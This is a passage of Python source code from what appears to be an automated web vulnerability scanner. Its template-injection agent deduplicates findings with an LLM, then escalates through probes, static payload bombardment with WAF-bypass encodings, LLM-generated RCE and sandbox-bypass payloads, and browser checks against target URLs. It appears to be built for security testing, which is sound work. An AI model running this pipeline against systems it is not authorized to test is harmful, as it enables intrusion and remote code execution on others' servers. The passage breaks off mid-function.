        Use LLM to intelligently deduplicate CSTI findings (v3.2: Context-Aware).
        Falls back to fingerprint-based dedup if LLM fails.
        """
        from bugtrace.core.llm_client import llm_client
        import json

        # Extract tech stack info for prompt (v3.2)
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        lang = tech_stack.get('lang', 'generic')
        frameworks = tech_stack.get('frameworks', [])
        waf = tech_stack.get('waf')

        # Get CSTI-specific context prompts
        csti_prime_directive = getattr(self, '_csti_prime_directive', '')
        csti_dedup_context = self.generate_csti_dedup_context(tech_stack) if tech_stack else ''

        # Detect engines for context
        raw_profile = tech_stack.get("raw_profile", {})
        tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
        detected_engines = self._detect_template_engines(frameworks, tech_tags, lang)

        # Build enhanced system prompt with tech context (v3.2)
        system_prompt = f"""You are an expert CSTI/SSTI deduplication analyst with deep knowledge of template engines.

{csti_prime_directive}

{csti_dedup_context}

## TARGET CONTEXT
- Backend Language: {lang}
- Detected Engines: {', '.join(detected_engines) if detected_engines else 'Unknown'}
- WAF: {waf or 'None detected'}
- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'Unknown'}

Your job is to identify and remove duplicate template injection findings while preserving unique vulnerabilities.
Different template engines represent different attack surfaces - NEVER merge findings with different engines."""

        prompt = f"""Analyze {len(wet_findings)} potential CSTI/SSTI findings.

## WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

## TASK
1. Apply engine-based deduplication rules
2. Distinguish CSTI (client-side: Angular, Vue) from SSTI (server-side: Jinja2, Twig)
3. Prioritize findings for detected engines: {detected_engines or ['generic']}
4. Remove true duplicates (same URL + param + engine)
5. IMPORTANT: For client-side engines (Angular, Vue), multiple params on the SAME PAGE share the same scope. Merge them into ONE finding per page per engine (keep the first param as representative)

## OUTPUT FORMAT (JSON only, no markdown):
{{
  "findings": [
    {{
      "url": "...",
      "parameter": "...",
      "template_engine": "jinja2|twig|angular|vue|freemarker|erb|unknown",
      "injection_type": "SSTI|CSTI",
      "rationale": "why unique",
      "attack_priority": 1-5,
      "recommended_payload": "specific payload for this engine"
    }}
  ],
  "duplicates_removed": <count>,
  "reasoning": "Brief deduplication strategy"
}}"""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                system_prompt=system_prompt,
                module_name="CSTI_DEDUP",
                temperature=0.2
            )

            # Parse LLM response
            result = json.loads(response)
            dry_list = result.get("findings", [])

            if dry_list:
                logger.info(f"[{self.name}] LLM deduplication: {result.get('reasoning', 'No reasoning')}")
                logger.info(f"[{self.name}] LLM deduplication successful: {len(wet_findings)} → {len(dry_list)}")
                return dry_list
            else:
                logger.warning(f"[{self.name}] LLM returned empty list, using fallback")
                return self._fallback_fingerprint_dedup(wet_findings)

        except Exception as e:
            logger.warning(f"[{self.name}] LLM deduplication failed: {e}, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication if LLM fails.
        Uses _generate_csti_fingerprint for expert dedup.
        """
        seen = set()
        dry_list = []

        for finding in wet_findings:
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")
            template_engine = finding.get("template_engine", "unknown")

            fingerprint = self._generate_csti_fingerprint(url, parameter, template_engine)

            if fingerprint not in seen:
                seen.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fingerprint dedup: {len(wet_findings)} → {len(dry_list)}")
        return dry_list

    def _normalize_csti_finding_params(self, findings: List[Dict]) -> List[Dict]:
        """
        Normalize synthetic param names from ThinkingConsolidation.

        Some findings have synthetic params like 'URL Path/Fragment', 'None (POST Body)',
        '_auto_discover', 'username password' etc. These are labels, not real query params.
        When the URL already has query params, expand the finding into one per real param.
        This ensures _inject() creates valid URLs for testing.
        """
        normalized = []
        seen_url_param = set()  # Dedup: (url_path, param) pairs

        for finding in findings:
            param = finding.get("parameter", "")
            url = finding.get("url", "")

            is_synthetic = (
                " " in param
                or "/" in param
                or param.startswith("_auto")
                or param.startswith("None")
                or param.startswith("URL ")
                or param.startswith("POST ")
            )

            if is_synthetic:
                parsed = urlparse(url)
                url_params = parse_qs(parsed.query)

                if url_params:
                    for real_param in url_params:
                        key = (parsed.path, real_param)
                        if key not in seen_url_param:
                            seen_url_param.add(key)
                            new_finding = dict(finding)
                            new_finding["parameter"] = real_param
                            new_finding["_original_parameter"] = param
                            normalized.append(new_finding)
                    logger.info(
                        f"[{self.name}] Normalized synthetic param '{param}' on {parsed.path} → {list(url_params.keys())}"
                    )
                else:
                    # No URL params — keep original (auto-discover will handle)
                    key = (parsed.path, param)
                    if key not in seen_url_param:
                        seen_url_param.add(key)
                        normalized.append(finding)
            else:
                parsed = urlparse(url)
                key = (parsed.path, param)
                if key not in seen_url_param:
                    seen_url_param.add(key)
                    normalized.append(finding)
                else:
                    logger.debug(f"[{self.name}] Dedup: skipping duplicate ({parsed.path}, {param})")

        if len(normalized) != len(findings):
            logger.info(f"[{self.name}] Param normalization: {len(findings)} → {len(normalized)} findings")
        return normalized

    async def exploit_dry_list(self) -> List[Dict]:
        """
        PHASE B: 6-Level Escalation Pipeline for each DRY finding.

        v3.4: Each finding goes through L1→L6 escalation,
        each level more expensive but catches more edge cases.

        Returns:
            List of validated findings
        """
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list (6-Level Escalation) =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        # Setup Interactsh for OOB detection across all findings
        if not self.interactsh:
            await self._setup_interactsh()

        # Prioritize real DASTySAST findings over auto-dispatch noise.
        # Auto-dispatch items have _auto_dispatched=True; real findings don't.
        real_findings = [f for f in self._dry_findings if not f.get("_auto_dispatched")]
        auto_findings = [f for f in self._dry_findings if f.get("_auto_dispatched")]
        ordered_findings = real_findings + auto_findings

        # Normalize synthetic param names (e.g. "URL Path/Fragment" → actual URL query params)
        ordered_findings = self._normalize_csti_finding_params(ordered_findings)
        logger.info(f"[{self.name}] Phase B: {len(real_findings)} real + {len(auto_findings)} auto-dispatch findings ({len(ordered_findings)} after normalization)")

        for idx, finding in enumerate(ordered_findings, 1):
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")

            # Skip API endpoints — CSTI only works on HTML pages with template rendering
            if "/api/" in url:
                logger.debug(f"[{self.name}] Phase B: Skipping API endpoint {url}")
                continue
            template_engine = finding.get("template_engine", "unknown")

            logger.info(f"[{self.name}] Phase B: [{idx}/{len(ordered_findings)}] Testing {url} param={parameter} engine={template_engine}")

            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.param.started", {"agent": "CSTI", "param": parameter, "url": url, "engine": template_engine, "idx": idx, "total": len(self._dry_findings)})
                self._v.reset("exploit.specialist.progress")

            # Check fingerprint to avoid re-emitting
            fingerprint = self._generate_csti_fingerprint(url, parameter, template_engine)
            if fingerprint in self._emitted_findings:
                logger.debug(f"[{self.name}] Phase B: Skipping already emitted finding")
                if hasattr(self, '_v'):
                    self._v.emit("exploit.specialist.param.completed", {"agent": "CSTI", "param": parameter, "url": url, "idx": idx, "skipped": True})
                continue

            # Execute 6-Level CSTI Escalation Pipeline
            # Wrap in asyncio timeout to prevent Playwright deadlocks (max 180s per item)
            # 180s allows full L0→L1→L2→L3→L5 pipeline for client-side engines (Angular/Vue)
            try:
                self.url = url
                try:
                    result = await asyncio.wait_for(
                        self._csti_escalation_pipeline(url, parameter, finding),
                        timeout=180.0
                    )
                except asyncio.TimeoutError:
                    logger.warning(f"[{self.name}] Phase B: TIMEOUT (180s) for {parameter} on {url[:60]}, skipping")
                    result = None

                if result and result.validated:
                    self._emitted_findings.add(fingerprint)

                    if hasattr(self, '_v'):
                        self._v.emit("exploit.specialist.confirmed", {"agent": "CSTI", "param": parameter, "url": url, "engine": result.template_engine, "payload": result.payload[:100], "status": "VALIDATED_CONFIRMED"})

                    finding_dict = {
                        "url": result.url,
                        "parameter": result.parameter,
                        "type": "CSTI",
                        "severity": result.severity,
                        "template_engine": result.template_engine,
                        "engine_type": result.engine_type,
                        "payload": result.payload,
                        "validated": True,
                        "status": "VALIDATED_CONFIRMED",
                        "description": result.description,
                        "evidence": result.evidence if hasattr(result, 'evidence') else {}
                    }

                    # Add alternative payloads if available
                    if result.successful_payloads:
                        finding_dict["successful_payloads"] = result.successful_payloads

                    validated_findings.append(finding_dict)

                    self._emit_csti_finding({
                        "type": "CSTI",
                        "url": result.url,
                        "parameter": result.parameter,
                        "severity": result.severity,
                        "template_engine": result.template_engine,
                        "engine_type": result.engine_type,
                        "payload": result.payload,
                        "evidence": result.evidence if hasattr(result, 'evidence') else {},
                        "arithmetic_proof": result.arithmetic_proof if hasattr(result, 'arithmetic_proof') else False,
                    }, scan_context=self._scan_context)

                    logger.info(f"[{self.name}] ✓ CSTI confirmed: {url} param={parameter} engine={template_engine}")
                else:
                    logger.debug(f"[{self.name}] ✗ CSTI not confirmed after 6-level escalation")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B: Escalation pipeline failed: {e}")
            finally:
                if hasattr(self, '_v'):
                    self._v.emit("exploit.specialist.param.completed", {"agent": "CSTI", "param": parameter, "url": url, "idx": idx})

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")
        return validated_findings

    # =========================================================================
    # v3.4: 6-Level CSTI Escalation Pipeline
    # =========================================================================

    async def _csti_escalation_pipeline(
        self, url: str, param: str, finding: dict
    ) -> Optional[CSTIFinding]:
        """
        v3.4: 6-Level CSTI Escalation Pipeline.

        Each level is more expensive but catches more edge cases.
        Stops at the first level that confirms CSTI.

        L0: WET payload        → Test DASTySAST's payload first (free)
        L1: Template probe     → Polyglot arithmetic check (instant)
        L2: Bombing 1 (static) → Engine-specific + universal payloads via HTTP
        L3: Bombing 2 (LLM)    → LLM-generated payloads × WAF encodings via HTTP
        L4: HTTP Manipulator    → ManipulatorOrchestrator (SSTI strategy + WAF bypass)
        L5: Browser testing     → Playwright DOM execution (Angular/Vue)
        L6: CDP Validation      → Flag for AgenticValidator
        """
        reflecting_payloads = []  # Template syntax that reflects but isn't confirmed

        # Detect template engines from HTML and finding metadata
        engines = await self._detect_engines_for_escalation(url, finding)

        # ===== AUTONOMOUS PARAM DISCOVERY (Specialist Autonomy Pattern) =====
        # ThinkingConsolidation may mismatch params and URLs. Discover real params
        # from the URL and test all of them. The DRY list param is just a "signal".
        params_to_test = [param]
        try:
            discovered = await self._discover_csti_params(url)
            if discovered:
                discovered_names = list(discovered.keys())
                # Add discovered params that aren't already in the list
                for dp in discovered_names:
                    if dp not in params_to_test:
                        params_to_test.append(dp)
                if len(params_to_test) > 1:
                    logger.info(
                        f"[{self.name}] Autonomous discovery: {len(params_to_test)} params to test on {url[:60]}: {params_to_test}"
                    )
        except Exception as e:
            logger.debug(f"[{self.name}] Autonomous discovery failed: {e}")

        # Test each discovered param through the full pipeline
        for test_param in params_to_test:
            result = await self._run_escalation_for_param(
                url, test_param, finding, engines, reflecting_payloads
            )
            if result:
                return result

        dashboard.log(f"[{self.name}] All 6 levels exhausted for all params on {url[:60]}, no CSTI confirmed", "WARN")
        return None

    async def _run_escalation_for_param(
        self, url: str, param: str, finding: dict,
        engines: List[str], reflecting_payloads: list
    ) -> Optional[CSTIFinding]:
        """Run the full L0-L6 escalation pipeline for a single param."""
        # Fetch baseline (no injection) for false positive checking
        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            baseline_html = await self._get_baseline_content(session)

        # ===== SMART PROBE: Skip if param doesn't reflect template syntax =====
        smart_result, should_continue = await self._escalation_smart_probe_csti(url, param, engines, baseline_html)
        if smart_result:
            return smart_result
        if not should_continue:
            return None

        # ===== L0: WET PAYLOAD FIRST (if available) =====
        wet_payload = finding.get("payload") or finding.get("exploitation_strategy") or finding.get("recommended_payload")
        if wet_payload:
            dashboard.log(f"[{self.name}] L0: Testing WET payload on '{param}'", "INFO")
            result = await self._escalation_l0_wet_payload(url, param, wet_payload, engines, baseline_html)
            if result:
                return result

        # ===== L1: TEMPLATE POLYGLOT PROBE =====
        dashboard.log(f"[{self.name}] L1: Template polyglot probe on '{param}'", "INFO")
        result = await self._escalation_l1_template_probe(url, param, baseline_html)
        if result:
            return result

        # ===== L2: BOMBING 1 - ENGINE-SPECIFIC + UNIVERSAL =====
        dashboard.log(f"[{self.name}] L2: Static bombardment on '{param}'", "INFO")
        result, l2_reflecting = await self._escalation_l2_static_bombing(url, param, engines, baseline_html)
        if result:
            return result
        reflecting_payloads.extend(l2_reflecting)

        # ===== L3: BOMBING 2 - LLM PAYLOADS × WAF ENCODINGS =====
        dashboard.log(f"[{self.name}] L3: LLM bombardment on '{param}'", "INFO")
        result, l3_reflecting = await self._escalation_l3_llm_bombing(url, param, engines, reflecting_payloads, baseline_html)
        if result:
            return result
        reflecting_payloads.extend(l3_reflecting)

        # ===== L4/L5: Engine-aware ordering =====
        # Client-side engines (Angular/Vue) only confirm in browser → L5 first
        # Server-side/unknown engines confirm via HTTP → L4 first
        has_client_side = any(e in ["angular", "vue"] for e in engines)

        if has_client_side:
            # For SPA apps, HTTP bombing may find zero reflections because the
            # response is a static shell rendered client-side. Seed L5 browser
            # candidates with engine-specific payloads so Playwright always runs.
            if not reflecting_payloads:
                spa_payloads = [p for p in PAYLOAD_LIBRARY.get("angular", [])[:10]]
                spa_payloads.extend(PAYLOAD_LIBRARY.get("universal", [])[:3])
                reflecting_payloads.extend(spa_payloads)
                logger.info(
                    f"[{self.name}] No HTTP reflections for client-side engine, seeding {len(spa_payloads)} browser payloads"
                )

            # Client-side: L5 Browser first, L4 Manipulator fallback
            if reflecting_payloads:
                dashboard.log(f"[{self.name}] L5: Browser testing {len(reflecting_payloads)} candidates on '{param}' (client-side priority)", "INFO")
                result = await self._escalation_l5_browser(url, param, reflecting_payloads)
                if result:
                    return result

            dashboard.log(f"[{self.name}] L4: HTTP Manipulator on '{param}' (fallback)", "INFO")
            result, l4_reflecting = await self._escalation_l4_http_manipulator(url, param)
            if result:
                return result
            reflecting_payloads.extend(l4_reflecting)
        else:
            # Server-side/unknown: L4 Manipulator first, L5 Browser fallback
            dashboard.log(f"[{self.name}] L4: HTTP Manipulator on '{param}'", "INFO")
            result, l4_reflecting = await self._escalation_l4_http_manipulator(url, param)
            if result:
                return result
            reflecting_payloads.extend(l4_reflecting)

            if reflecting_payloads:
                dashboard.log(f"[{self.name}] L5: Browser testing {len(reflecting_payloads)} candidates on '{param}'", "INFO")
                result = await self._escalation_l5_browser(url, param, reflecting_payloads)
                if result:
                    return result

        # ===== L6: CDP VALIDATION (AgenticValidator) =====
        if reflecting_payloads:
            dashboard.log(f"[{self.name}] L6: Flagging for CDP AgenticValidator on '{param}'", "INFO")
            result = await self._escalation_l6_cdp(url, param, reflecting_payloads)
            if result:
                return result

        dashboard.log(f"[{self.name}] All 6 levels exhausted for '{param}' on {url[:60]}", "WARN")
        return None

    # ===== ESCALATION HELPER METHODS =====

    async def _escalation_smart_probe_csti(
        self, url: str, param: str, engines: List[str], baseline_html: str
    ) -> tuple:
        """
        Smart probe: 1 request to check if template syntax reflects or evaluates.

        Returns:
            (CSTIFinding or None, should_continue: bool)
            - If finding returned: confirmed CSTI
            - should_continue=False: no reflection, skip this param entirely
            - should_continue=True: reflects, continue normal escalation
        """
        probe = "BT_CSTI_49{{7*7}}${7*7}"
        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            response, verified_url = await self._send_csti_payload_raw(session, param, probe)
            if response is None:
                return None, True  # Network error, continue anyway

            # Check if probe marker reflects at all
            if "BT_CSTI_49" not in response:
                # For client-side engines (Angular/Vue in SPA), params may only reflect
                # in the DOM after JavaScript rendering, not in raw HTTP response
                if any(e in ["angular", "vue"] for e in engines):
                    dashboard.log(
                        f"[{self.name}] Smart probe: no HTTP reflection for '{param}' but client-side engine detected, continuing to browser testing",
                        "INFO",
                    )
                    return None, True  # Continue — L5 Playwright will check DOM
                dashboard.log(
                    f"[{self.name}] Smart probe: no reflection for '{param}', skipping",
                    "INFO",
                )
                return None, False

            # Check if template evaluation happened (7*7 = 49)
            # "49" in response AND "7*7" NOT in response AND not in baseline
            if "49" in response and "7*7" not in response and "49" not in baseline_html:
                if hasattr(self, '_v'):
                    self._v.emit("exploit.specialist.signature_match", {"agent": "CSTI", "param": param, "payload": probe[:100], "method": "smart_probe"})
                dashboard.log(
                    f"[{self.name}] Smart probe: CONFIRMED CSTI on '{param}' ({{{{7*7}}}}=49)",
                    "INFO",
                )
                # Detect which engine evaluated
                engine = "unknown"
                if any(e in ["angular", "vue"] for e in engines):
                    engine = engines[0]
                finding = self._create_finding(param, "{{7*7}}", "smart_probe", verified_url=verified_url)
                finding.evidence = {
                    "method": "arithmetic_eval",
                    "proof": "{{7*7}} evaluated to 49",
                    "status": "VALIDATED_CONFIRMED",
                    "level": "smart_probe",
                    "engine": engine,
                }
                return finding, True

            dashboard.log(
                f"[{self.name}] Smart probe: '{param}' reflects, continuing escalation",
                "INFO",
            )
            return None, True

    async def _detect_engines_for_escalation(self, url: str, finding: dict) -> List[str]:
        """Detect template engines from HTML fingerprinting + finding metadata + tech_profile."""
        engines = []

        # From finding metadata
        suggested = finding.get("template_engine", "unknown")
        if suggested and suggested != "unknown":
            engines.append(suggested)

        # From tech_profile (Nuclei detection)
        if self.tech_profile and self.tech_profile.get("frameworks"):
            for framework in self.tech_profile["frameworks"]:
                fw_lower = framework.lower()
                if "angular" in fw_lower and "angular" not in engines:
                    engines.append("angular")
                elif "vue" in fw_lower and "vue" not in engines:
                    engines.append("vue")

        # From HTML fingerprinting
        try:
            async with http_manager.isolated_session(ConnectionProfile.PROBE) as session:
                html = await self._fetch_page(session)
                if html:
                    html_engines = TemplateEngineFingerprinter.fingerprint(html)
                    for e in html_engines:
                        if e != "unknown" and e not in engines:
                            engines.append(e)
        except Exception:
            pass

        logger.info(f"[{self.name}] Detected engines for escalation: {engines or ['unknown']}")
        return engines

    async def _send_csti_payload_raw(self, session, param: str, payload: str) -> Tuple[Optional[str], Optional[str]]:
        """Fire a CSTI payload and return raw HTTP response. No validation."""
        target_url = self._inject(param, payload)
        try:
            async with session.get(target_url, timeout=8) as resp:
                content = await resp.text()
                return content, str(resp.url)
        except Exception as e:
            logger.debug(f"[{self.name}] Send payload failed: {e}")
            return None, None

    def _check_csti_confirmed(self, payload: str, response_html: str, baseline_html: str) -> Tuple[bool, Dict]:
        """
        Check if CSTI is confirmed in HTTP response.

        Returns (confirmed, evidence) tuple.
        Checks: arithmetic evaluation, string multiplication, config reflection,
        engine signatures, error signatures.
        """
        if not response_html:
            return False, {}

        evidence = {"payload": payload}

        # 1. Arithmetic evaluation (7*7=49)
        if "49" in response_html and "7*7" in payload:
            if payload not in response_html:
                if "49" not in baseline_html:
                    evidence["method"] = "arithmetic_eval"
                    evidence["proof"] = "7*7 evaluated to 49"
                    evidence["status"] = "VALIDATED_CONFIRMED"
                    return True, evidence

        # 2. Constructor evaluation (return 7*7 → 49)
        if "constructor" in payload and "49" in response_html:
            if payload not in response_html and "49" not in baseline_html:
                evidence["method"] = "constructor_eval"
                evidence["proof"] = "Constructor payload evaluated to 49"
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True, evidence

        # 3. String multiplication ('7'*7 → 7777777)
        if "7777777" in response_html and "'7'*7" in payload:
            if payload not in response_html:
                evidence["method"] = "string_multiplication"
                evidence["proof"] = "'7'*7 evaluated to 7777777"
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True, evidence

        # 4. Config reflection (Jinja2)
        if "{{config}}" in payload and ("Config" in response_html or "&lt;Config" in response_html):
            if payload not in response_html:
                evidence["method"] = "config_reflection"
                evidence["proof"] = "{{config}} accessed Config object"
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True, evidence

        # 5. Engine signatures
        if ("{{dump(app)}}" in payload or "{{app.request}}" in payload) and ("Symfony" in response_html or "Twig" in response_html):
            evidence["method"] = "engine_signature_twig"
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True, evidence

        if "{$smarty.version}" in payload and re.search(r"Smarty[- ]\d", response_html):
            evidence["method"] = "engine_signature_smarty"
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True, evidence

        # 6. Error signatures (template engine errors indicate processing)
        error_signatures = [
            "jinja2.exceptions", "Twig_Error_Syntax", "FreeMarker template error",
            "VelocityException", "org.apache.velocity", "mako.exceptions"
        ]
        for sig in error_signatures:
            if sig in response_html:
                evidence["method"] = "error_signature"
                evidence["proof"] = f"Template error: {sig}"
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True, evidence

        # 7. Conditional evaluation ({% if %})
        if "{% if" in payload and "49" in payload:
            if "{%" not in response_html and "%}" not in response_html and "49" in response_html:
                evidence["method"] = "conditional_eval"
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True, evidence

        # 8. RCE indicators (command output in response)
        # IMPORTANT: Skip indicators that are part of the payload itself.
        # If we sent "java.lang.Runtime" and it reflects back, that's NOT proof
        # of execution - only genuine command OUTPUT (uid=, root:) counts.
        for indicator in HIGH_IMPACT_INDICATORS:
            if indicator in response_html and indicator not in baseline_html:
                if any(rce in payload for rce in ["popen", "exec", "system", "Runtime", "subprocess"]):
                    # Guard: indicator must NOT be a substring of the payload
                    # (if it is, the response just reflects our input, not execution output)
                    if indicator in payload:
                        continue
                    evidence["method"] = "rce_indicator"
                    evidence["proof"] = f"RCE indicator: {indicator}"
                    evidence["status"] = "VALIDATED_CONFIRMED"
                    return True, evidence

        return False, evidence

    # ===== ESCALATION LEVEL IMPLEMENTATIONS =====

    async def _escalation_l0_wet_payload(
        self, url: str, param: str, wet_payload: str, engines: List[str], baseline_html: str
    ) -> Optional[CSTIFinding]:
        """L0: Test the WET finding's payload first (from DASTySAST/Skeptic)."""
        dashboard.set_current_payload(wet_payload[:60], "CSTI L0", "WET payload", self.name)

        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            response, verified_url = await self._send_csti_payload_raw(session, param, wet_payload)
            if response is not None:
                confirmed, evidence = self._check_csti_confirmed(wet_payload, response, baseline_html)
                if confirmed:
                    evidence["level"] = "L0"
                    finding = self._create_finding(param, wet_payload, "L0_wet_payload", verified_url=verified_url)
                    finding.evidence = evidence
                    return finding

            # Try double-quote variant if single-quote payload failed
            if "'" in wet_payload:
                dq_payload = wet_payload.replace("'", '"')
                dashboard.set_current_payload(dq_payload[:60], "CSTI L0", "WET DQ variant", self.name)
                response, verified_url = await self._send_csti_payload_raw(session, param, dq_payload)
                if response is not None:
                    confirmed, evidence = self._check_csti_confirmed(dq_payload, response, baseline_html)
                    if confirmed:
                        evidence["level"] = "L0"
                        finding = self._create_finding(param, dq_payload, "L0_wet_dq_variant", verified_url=verified_url)
                        finding.evidence = evidence
                        return finding

        logger.info(f"[{self.name}] L0: WET payload not confirmed for '{param}'")
        return None

    async def _escalation_l1_template_probe(
        self, url: str, param: str, baseline_html: str
    ) -> Optional[CSTIFinding]:
        """L1: Send polyglot template probes, check HTTP arithmetic evaluation."""
        probes = [
            "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",  # Multi-engine polyglot
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{7*'7'}}",
        ]

        confirmed_payloads = []
        first_finding = None

        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            for probe in probes:
                dashboard.set_current_payload(probe, "CSTI L1", "Polyglot", self.name)
                response, verified_url = await self._send_csti_payload_raw(session, param, probe)
                if response is None:
                    continue

                confirmed, evidence = self._check_csti_confirmed(probe, response, baseline_html)
                if confirmed:
                    confirmed_payloads.append(probe)
                    if not first_finding:
                        evidence["level"] = "L1"
                        first_finding = self._create_finding(param, probe, "L1_template_probe", verified_url=verified_url)
                        first_finding.evidence = evidence
                    if len(confirmed_payloads) >= 5:
                        break

        # Check Interactsh OOB
        if not first_finding and self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    first_finding = self._create_finding(param, probes[0], "L1_interactsh_oob")
                    first_finding.evidence = {"method": "L1_interactsh_oob", "oob": True, "level": "L1"}
                    confirmed_payloads.append(probes[0])
            except Exception:
                pass

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            logger.info(f"[{self.name}] L1: {len(confirmed_payloads)} confirmed for '{param}'")
            return first_finding

        logger.info(f"[{self.name}] L1: No CSTI confirmed for '{param}'")
        return None

    async def _escalation_l2_static_bombing(
        self, url: str, param: str, engines: List[str], baseline_html: str
    ) -> tuple:
        """L2: Fire all engine-specific + universal payloads via HTTP."""
        # Build payload list: engine-specific first, then universal, polyglots, WAF bypass
        all_payloads = []
        seen = set()

        # Engine-specific payloads first (prioritized)
        for engine in engines:
            for p in PAYLOAD_LIBRARY.get(engine, []):
                if p not in seen:
                    seen.add(p)
                    all_payloads.append(p)

        # Universal + polyglots + WAF bypass
        for key in ["universal", "polyglots", "waf_bypass"]:
            for p in PAYLOAD_LIBRARY.get(key, []):
                if p not in seen:
                    seen.add(p)
                    all_payloads.append(p)

        # All remaining engine payloads (engines not yet covered)
        for engine_name in PAYLOAD_LIBRARY:
            if engine_name not in ["universal", "polyglots", "waf_bypass"] + engines:
                for p in PAYLOAD_LIBRARY.get(engine_name, []):
                    if p not in seen:
                        seen.add(p)
                        all_payloads.append(p)

        # Replace Interactsh placeholders
        if self.interactsh_url:
            all_payloads = [p.replace("{{INTERACTSH}}", self.interactsh_url) for p in all_payloads]

        # Apply WAF bypass encodings
        all_payloads = await self._get_encoded_payloads(all_payloads)

        logger.info(f"[{self.name}] L2: Bombing {len(all_payloads)} static payloads on '{param}'")

        confirmed_payloads = []
        first_finding = None
        reflecting = []

        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            for i, payload in enumerate(all_payloads):
                if hasattr(self, '_v'):
                    self._v.progress("exploit.specialist.progress", {"agent": "CSTI", "param": param, "payload": payload[:80], "i": i, "total": len(all_payloads)}, every=50)
                if i % 20 == 0 and i > 0:
                    dashboard.log(f"[{self.name}] L2: Progress {i}/{len(all_payloads)}", "DEBUG")
                dashboard.set_current_payload(payload[:60], "CSTI L2", f"{i+1}/{len(all_payloads)}", self.name)

                response, verified_url = await self._send_csti_payload_raw(session, param, payload)
                if response is None:
                    continue

                # Check for CSTI confirmation
                confirmed, evidence = self._check_csti_confirmed(payload, response, baseline_html)
                if confirmed:
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.specialist.signature_match", {"agent": "CSTI", "param": param, "payload": payload[:100], "method": "L2_static_bombing"})
                    confirmed_payloads.append(payload)
                    if not first_finding:
                        evidence["level"] = "L2"
                        first_finding = self._create_finding(param, payload, "L2_static_bombing", verified_url=verified_url)
                        first_finding.evidence = evidence
                    if len(confirmed_payloads) >= 5:
                        break
                    continue

                # Track payloads where template syntax reflects (for L5 browser)
                if payload in response or ("49" in response and "49" not in baseline_html):
                    reflecting.append(payload)

        # Batch OOB check
        if not first_finding and self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    best = all_payloads[0] if all_payloads else "{{7*7}}"
                    first_finding = self._create_finding(param, best, "L2_interactsh_oob")
                    first_finding.evidence = {"method": "L2_interactsh_oob", "oob": True, "level": "L2"}
                    confirmed_payloads.append(best)
            except Exception:
                pass

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            logger.info(f"[{self.name}] L2: {len(confirmed_payloads)} confirmed, {len(reflecting)} reflecting for '{param}'")
            return first_finding, reflecting

        logger.info(f"[{self.name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
        return None, reflecting

    async def _escalation_l3_llm_bombing(
        self, url: str, param: str, engines: List[str],
        existing_reflecting: list, baseline_html: str
    ) -> tuple:
        """L3: Generate LLM CSTI payloads × WAF encodings, fire via HTTP."""
        engine_hint = engines[0] if engines else "unknown"
        tech_context = self._csti_prime_directive if hasattr(self, '_csti_prime_directive') else ""

        user_prompt = (
            f"Target URL: {url}\nParameter: {param}\nDetected engine: {engine_hint}\n"
            f"Tech context: {tech_context}\n\n"
            f"Generate 50 advanced CSTI/SSTI payloads for template injection testing. "
            f"Include variations for: Angular, Vue, Jinja2, Twig, Freemarker, Mako, ERB, Velocity. "
            f"Focus on arithmetic evaluation (7*7=49), config access, sandbox bypasses, and RCE. "
            f"Include double-quote variants for servers that reject single quotes. "
            f"Return each payload in <payload> tags."
        )

        try:
            response = await llm_client.generate(user_prompt, system_prompt=self.system_prompt, module_name="CSTI_L3")
            llm_payloads = XmlParser.extract_list(response, "payload")
        except Exception as e:
            logger.error(f"[{self.name}] L3: LLM generation failed: {e}")
            llm_payloads = []

        if not llm_payloads:
            logger.info(f"[{self.name}] L3: LLM generated 0 payloads, skipping")
            return None, []

        # Apply WAF encodings
        llm_payloads = await self._get_encoded_payloads(llm_payloads)

        # Replace Interactsh placeholders
        if self.interactsh_url:
            llm_payloads = [p.replace("{{INTERACTSH}}", self.interactsh_url) for p in llm_payloads]

        logger.info(f"[{self.name}] L3: Bombing {len(llm_payloads)} LLM payloads on '{param}'")

        confirmed_payloads = []
        first_finding = None
        reflecting = []

        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            for i, payload in enumerate(llm_payloads):
                if i % 20 == 0 and i > 0:
                    dashboard.log(f"[{self.name}] L3: Progress {i}/{len(llm_payloads)}", "DEBUG")
                dashboard.set_current_payload(payload[:60], "CSTI L3", f"{i+1}/{len(llm_payloads)}", self.name)

                response, verified_url = await self._send_csti_payload_raw(session, param, payload)
                if response is None:
                    continue

                confirmed, evidence = self._check_csti_confirmed(payload, response, baseline_html)
                if confirmed:
                    confirmed_payloads.append(payload)
                    if not first_finding:
